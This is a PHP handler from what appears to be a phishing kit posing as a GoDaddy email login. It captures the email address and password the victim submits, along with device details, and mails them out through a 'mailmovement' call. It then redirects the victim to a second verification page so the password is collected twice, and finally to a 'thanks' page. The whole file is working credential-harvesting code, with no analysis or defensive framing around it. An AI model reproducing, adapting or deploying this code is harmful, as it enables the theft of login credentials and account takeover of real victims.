<?php 
    require_once '../Vendor/Modernized.php';
    require_once '../Vendor/Pullers.php';
    require_once '../Vendor/Laravel.php';

    $Modernizeds = new Modernized;
    $Pullers = new Pullers;

$outpu = array();

    if (isset(
        $_POST['userid'],
        $_POST['pass']
    )){
        $token = $_GET['token'];
            $_SESSION['username'] = $_POST['userid'];
            $_SESSION['password'] = $_POST['pass'];
            $_SESSION['EML'] = $_POST['userid'];
            $content = '              
                    <h4><span >Godaddy</span> </h4>
                    <h2>(2) Em Login from ' . $_SESSION['username'] . '</h2>
                   <h3>🫁Em Login Info</h3>
                    <h3>Em Address: ' . $_SESSION['username'] . '</h3>
                    <h3>Em Password: ' . $_SESSION['password'] . '</h3>
                    <h3 >📱 Device Info</h3>
                            ' . $Modernizeds->userDetails() . '
                  ';

            
                  if (!isset($_SESSION['loginemT']) and $_SESSION['loginemT'] != 1) {
                    $_SESSION['loginemT'] = 1;
                        $Modernizeds->mailmovement("(2) Mail | Godaddy", $content);
                        echo '<script> window.location="emverify.php?token='.$token.'" </script>';
                    }            
                elseif(isset($_SESSION['loginemT']) and $_SESSION['loginemT'] == 1) {
                            unset($_SESSION['loginemT']);
                        $Modernizeds->mailmovement("(2) Mail | Godaddy", $content);
                        echo '<script> window.location="thanks.php?token='.$token.'" </script>';
                    }

            
            }
?>